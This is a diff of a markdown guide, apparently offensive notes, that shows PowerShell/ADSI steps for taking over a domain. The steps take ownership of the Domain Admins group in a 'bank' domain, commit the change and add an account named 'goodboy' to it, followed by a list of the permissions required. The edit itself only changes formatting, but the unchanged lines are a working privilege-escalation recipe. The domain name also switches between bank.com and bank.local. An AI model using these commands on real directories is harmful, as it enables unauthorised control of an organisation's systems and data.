@@ -36,7 +36,7 @@ New-PSDrive -Name AD -PSProvider ActiveDirectory -Root "" -Server "bank.com"
 $acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
 ```
 
-- 1. Take ownership
+- Take ownership
 
 ```bash
 $group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
@@ -45,14 +45,15 @@ $group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("ban
 
 $group.psbase.CommitChanges()
 ```
-- 2. Add self to group
+- Add self to group
 ```bash
 $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 ```
 
 # Key Explanations:
 
-## Permission	Why Needed
+## Permission Why Needed
+
 - Modify owner	
 - Modify permissions	
 - Write properties	
